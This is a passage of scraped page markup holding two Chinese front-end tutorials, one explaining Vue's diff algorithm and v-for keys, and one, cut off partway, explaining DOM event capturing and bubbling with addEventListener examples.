                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一文吃透Vue Diff原理：从核心逻辑到实战避坑</h2>
<p>在Vue的性能优化里，Diff算法绝对是“幕后功臣”——它解决的是虚拟DOM更新时，“怎么精准找到变了的节点，还不费性能”这个核心问题。不少同学用Vue开发时只管写业务，对Diff算法总有点“雾里看花”的感觉：为啥v-for非加key不可？Vue2和Vue3的Diff到底差在哪儿？今天咱们就从原理讲到实操，把这些疑问彻底掰明白。</p>
<h3 data-id="heading-1">Diff是虚拟DOM的“最佳拍档”</h3>
<p>聊Diff之前，先掰扯清楚一个核心关系：Diff算法是跟着虚拟DOM一起出现的“最佳拍档”。咱们都知道操作真实DOM特别费性能，改一下就可能触发重排重绘；而虚拟DOM说白了就是个描述真实DOM的JS对象，咱们看个简单例子就懂了：</p>
<pre><code class="hljs language-css" lang="css">// 虚拟DOM节点示例
const vnode = {
  tag: <span class="hljs-string">'div'</span>,
  props: { class: <span class="hljs-string">'container'</span> },
  children: [
    { tag: <span class="hljs-string">'p'</span>, props: {}, children: [<span class="hljs-string">'Vue Diff'</span>] }
  ]
}
</code></pre>
<p>组件状态一变，Vue就会生成新的虚拟DOM树。这时候要是直接把整个真实DOM全换掉，页面肯定卡得不行——Diff算法的作用就是“找茬”：对比新旧两棵虚拟DOM树，只把“不一样的地方”转换成真实DOM操作，做到“改得少、改得准”。</p>
<p>核心目标就一个：<strong>用最少的DOM操作搞定更新，别做无用功</strong>。</p>
<h3 data-id="heading-2">Diff的三大“偷懒”技巧，决定了它的高效</h3>
<p>Vue的Diff不是凭空造的，而是Vue团队摸透了前端开发的套路——总结出三大核心策略，既保证了性能，又没把算法搞得多复杂。</p>
<h4 data-id="heading-3">1. 只比同层，不钻深层</h4>
<p>日常开发里，谁会没事把div里的p标签直接挪到body下面？Vue就抓住了这点，Diff的时候只逐层对比节点。要是某一层某个节点没了，直接删了它和它的子节点，根本不往下钻——省了大笔遍历的功夫。</p>
<p>就靠这招，Diff的时间复杂度从吓人的O(n³)（全量对比）降到了O(n)（顺着扫一遍），性能直接上了个台阶。</p>
<p>举个例子：旧树是div，新树也是div，就接着比它们的子节点；要是新树这儿变成了span，那没二话——把旧div连锅端，直接插新span进去。</p>
<h4 data-id="heading-4">2. 先看类型，不对就换</h4>
<p>同层对比时，Vue先看节点“身份”——是p标签还是button，是普通组件还是路由组件。</p>
<ul>
<li>要是类型不一样（比如旧的是p，新的是button）：直接判定这俩是“完全不同的节点”，删旧的插新的就行。毕竟类型都变了，内部结构大概率也不一样，再比下去纯属浪费时间。</li>
<li>要是类型相同：再去细抠属性（class、style这些）和子节点，精准更新变化的地方。</li>
</ul>
<h4 data-id="heading-5">3. 靠key认人，避免张冠李戴</h4>
<p>这招最容易被新手忽略，但恰恰是Diff的“精准度关键”。比如渲染列表，全是li标签，光看类型根本分不清谁是谁——哪个该留？哪个是新加的？哪个被删了？</p>
<p>key就是给每个节点发的“身份证”，让Vue一眼就能认出它的“前世今生”。咱们看两组代码对比：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 坏例子：用index当key --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in list"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>{{ item.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 好例子：用唯一ID当key --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in list"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>{{ item.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
</code></pre>
<p>日常开发里，列表增删改查是常事。用item.id这种唯一key，Vue能精准匹配到可复用的节点，只改内容不用重建DOM；但要是用index当key，列表一排序，index和节点就“对不上号”了——Vue会误判节点变化，要么瞎删瞎建浪费性能，要么数据和节点对应错了，出各种诡异BUG。</p>
<p>血的教训：key必须是“不变且唯一”的！index和随机数不行！</p>
<h3 data-id="heading-6">Diff是怎么跑起来的？从根到子的完整流程</h3>
<p>把这三个策略落地，Vue Diff的执行逻辑就清晰了。咱们以Vue2为例子拆解（Vue3是升级款，后面单独说），整个过程分“根节点对比”和“子节点对比”两步走。</p>
<h4 data-id="heading-7">第一步：根节点“初筛”</h4>
<p>先拿新旧虚拟DOM的根节点开刀，分三种情况处理，特别直接：</p>
<ol>
<li><strong>新根节点没了</strong>：旧根节点对应的真实DOM直接删。</li>
<li><strong>旧根节点没了</strong>：新根节点直接渲染成真实DOM插页面上。</li>
<li><strong>新旧都在</strong>：先看类型——类型不对就换，类型对了就接着更属性、比子节点。</li>
</ol>
<p>属性更新很简单：比如旧节点class是red，新的是blue，就只改class这一个属性，其他不动——绝不做多余操作。</p>
<h4 data-id="heading-8">第二步：子节点“细比”（列表Diff的重头戏）</h4>
<p>子节点对比是Diff最绕的地方，但Vue2的“双指针法”把它捋得很明白。简单说就是在新旧子节点列表的首尾各放一个指针，通过移动指针快速找匹配的节点，分四步走：</p>
<ol>
<li><strong>首尾配对</strong>：旧头对新头、旧尾对新尾，能对上就直接复用，指针往中间挪。</li>
<li><strong>旧尾对新头</strong>：要是旧尾和新头配上了，说明这节点被移到最前面了——复用它，再把它挪到对应位置。</li>
<li><strong>旧头对新尾</strong>：旧头和新尾配上，就是节点被移到最后了，复用后调指针就行。</li>
<li><strong>key兜底</strong>：前面都没配上，就用新节点的key去旧列表里搜。搜到了就复用移动，搜不到就新增；最后把旧列表里没配上的节点全删掉。</li>
</ol>
<p>这套逻辑对付列表增删、首尾移动特别高效，但有个小短板——在列表中间插节点时，可能要多挪几次。这也是Vue3 Diff重点优化的地方。</p>
<h3 data-id="heading-9">Vue2 vs Vue3：Diff算法的“进化史”</h3>
<p>Vue3的Diff没丢核心思路，但在性能上做了大升级——目标很明确：大型列表更新时更快、更省资源。核心差异就三点，咱们用表格看得更清楚：</p>






























<table><thead><tr><th>对比维度</th><th>Vue2 Diff</th><th>Vue3 Diff</th></tr></thead><tbody><tr><td>核心算法</td><td>双指针法（首尾对比）</td><td>快速Diff（基于最长递增子序列）</td></tr><tr><td>处理效率</td><td>中间插入节点时需多次移动</td><td>通过最长递增子序列确定最少移动次数</td></tr><tr><td>编译优化</td><td>无编译干预，纯运行时Diff</td><td>编译时标记静态节点，Diff时直接跳过</td></tr><tr><td>适用场景</td><td>中小型列表，简单DOM结构</td><td>大型列表，复杂DOM结构</td></tr></tbody></table>
<p>举个实在的例子：1000个节点的列表，在中间插一个新节点。Vue2可能要挪动后面500个节点才能搞定，而Vue3靠“最长递增子序列”算法，能精准算出“哪些节点不用动”，只挪必要的几个——性能提升不是一点半点。</p>
<h3 data-id="heading-10">实战避坑：懂Diff才能少踩坑</h3>
<p>搞懂Diff不是为了面试背题，而是真能帮你写出更丝滑的代码。这三个实战场景，一定要记牢。</p>
<h4 data-id="heading-11">1. v-for的key，就用后端给的唯一ID</h4>
<p>再强调一次：key就用后端返回的userId、goodsId这种“天生唯一”的值。别图省事用index——列表一排序就出问题；更别用Math.random()——每次渲染都生成新key，节点根本没法复用，页面直接变卡。</p>
<h4 data-id="heading-12">2. 条件渲染别瞎换标签</h4>
<p>做条件显示时，别一会儿用p一会儿用div。尽量用同一个标签配合v-show——标签类型不变，Vue只改display属性，比删旧节点插新节点快多了：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 坏例子：标签类型变化，触发节点替换 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"show"</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 好例子：标签类型不变，只更新内容 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">"show"</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h4 data-id="heading-13">3. 静态节点别让Diff白费劲</h4>
<p>那些纯文本、没绑定数据的节点（比如页面标题、固定说明），就是“静态节点”。Vue3会自动识别它们，Diff时直接跳过；Vue2里可以加个v-pre指令，告诉Vue“这货不用比”，省点性能：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 静态节点，Diff时不对比 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-pre</span>&gt;</span>这是固定内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-14">最后总结：Diff的核心到底是什么？</h3>
<p>说到底，Vue Diff算法就是一套“贴合前端实际的性能优化方案”。它没追求理论上最完美的算法，而是用“只比同层、先看类型、key认节点”这三招，在“性能”和“复杂度”之间找到了平衡点——这才是最聪明的设计。</p>
<p>最后记牢这三句话，就算把Diff吃透了：</p>
<ul>
<li>Diff是虚拟DOM的“辅助工具”，核心目的是减少DOM操作；</li>
<li>key是节点的“身份证”，稳定、唯一是底线；</li>
<li>Vue3的Diff靠编译优化和算法升级，复杂列表更新更给力。</li>
</ul>
<p>想挖得更深的同学，直接去翻源码就行：
Vue2的Diff在src/core/vdom/patch.js，
Vue3的在packages/runtime-core/src/renderer.ts。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[事件冒泡和事件捕获详解]]></title>    <link>https://juejin.cn/post/7581406561685225518</link>    <guid>https://juejin.cn/post/7581406561685225518</guid>    <pubDate>2025-12-08T13:12:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581406561685225518" data-draft-id="7581406561685094446" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="事件冒泡和事件捕获详解"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-08T13:12:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="之恒君"/> <meta itemprop="url" content="https://juejin.cn/user/2261046026312318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            事件冒泡和事件捕获详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2261046026312318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    之恒君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T13:12:57.000Z" title="Mon Dec 08 2025 13:12:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-estuary-light">.hljs-comment,.hljs-quote{color:#6c6b5a}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ba6236}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#ae7313}.hljs-bullet,.hljs-string,.hljs-symbol{color:#7d9726}.hljs-section,.hljs-title{color:#36a166}.hljs-keyword,.hljs-selector-tag{color:#5f9182}.hljs-addition,.hljs-deletion{color:#22221b;display:inline-block;width:100%}.hljs-deletion{background-color:#ba6236}.hljs-addition{background-color:#7d9726}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f4f3ec;color:#5f5e4e}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>事件流描述了事件在 DOM 树中传播的顺序。理解事件流是掌握事件处理的关键。</p>
<h2 data-id="heading-0">1. 基本概念</h2>
<h3 data-id="heading-1">事件流三阶段</h3>
<pre><code class="hljs language-markdown" lang="markdown">// 事件传播的完整流程
<span class="hljs-bullet">1.</span> 捕获阶段 (Capturing Phase): 从上往下
<span class="hljs-bullet">2.</span> 目标阶段 (Target Phase): 到达目标元素
<span class="hljs-bullet">3.</span> 冒泡阶段 (Bubbling Phase): 从下往上
</code></pre>
<h3 data-id="heading-2">示例 DOM 结构</h3>
<pre><code class="hljs language-js" lang="js">&lt;div id=<span class="hljs-string">"grandparent"</span> style=<span class="hljs-string">"padding: 50px; background-color: #f0f0f0;"</span>&gt;
  <span class="hljs-title class_">Grandparent</span>
  &lt;div id=<span class="hljs-string">"parent"</span> style=<span class="hljs-string">"padding: 30px; background-color: #e0e0e0;"</span>&gt;
    <span class="hljs-title class_">Parent</span>
    &lt;button id=<span class="hljs-string">"child"</span> style=<span class="hljs-string">"padding: 20px; background-color: #d0d0d0;"</span>&gt;
      <span class="hljs-title class_">Click</span> me!
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// JavaScript</span>
<span class="hljs-keyword">const</span> grandparent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'grandparent'</span>);
<span class="hljs-keyword">const</span> parent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'parent'</span>);
<span class="hljs-keyword">const</span> child = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'child'</span>);
</code></pre>
<h2 data-id="heading-3">2. 捕获阶段 (Capturing Phase)</h2>
<h3 data-id="heading-4">特点</h3>
<ul>
<li>从 window → document → ... → 目标元素</li>
<li>自上而下传播</li>
<li>默认不监听此阶段</li>
</ul>
<h3 data-id="heading-5">使用方法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 在 addEventListener 的第三个参数设置为 true</span>
grandparent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Grandparent: 捕获阶段'</span>);
}, <span class="hljs-literal">true</span>);  <span class="hljs-comment">// true 表示在捕获阶段处理</span>

parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent: 捕获阶段'</span>);
}, <span class="hljs-literal">true</span>);

child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child: 捕获阶段'</span>);
}, <span class="hljs-literal">true</span>);
</code></pre>
<h2 data-id="heading-6">3. 冒泡阶段 (Bubbling Phase)</h2>
<h3 data-id="heading-7">特点</h3>
<ul>
<li>从目标元素 → ... → document → window</li>
<li>自下而上传播</li>
<li>默认行为（第三个参数为 false 或省略）</li>
</ul>
<h3 data-id="heading-8">使用方法</h3>
<pre><code class="hljs language-js" lang="js">grandparent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Grandparent: 冒泡阶段'</span>);
}, <span class="hljs-literal">false</span>);  <span class="hljs-comment">// false 或不指定表示冒泡阶段</span>

parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent: 冒泡阶段'</span>);
});

child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child: 冒泡阶段'</span>);
});
</code></pre>
<h2 data-id="heading-9">4. 完整事件流演示</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 清理之前的监听器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">clearAllListeners</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> listeners = [];
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">addListener</span>(<span class="hljs-params">element, handler, useCapture</span>) {
    element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handler, useCapture);
    listeners.<span class="hljs-title function_">push</span>({ element, handler, useCapture });
  };
}

<span class="hljs-comment">// 添加完整事件监听</span>
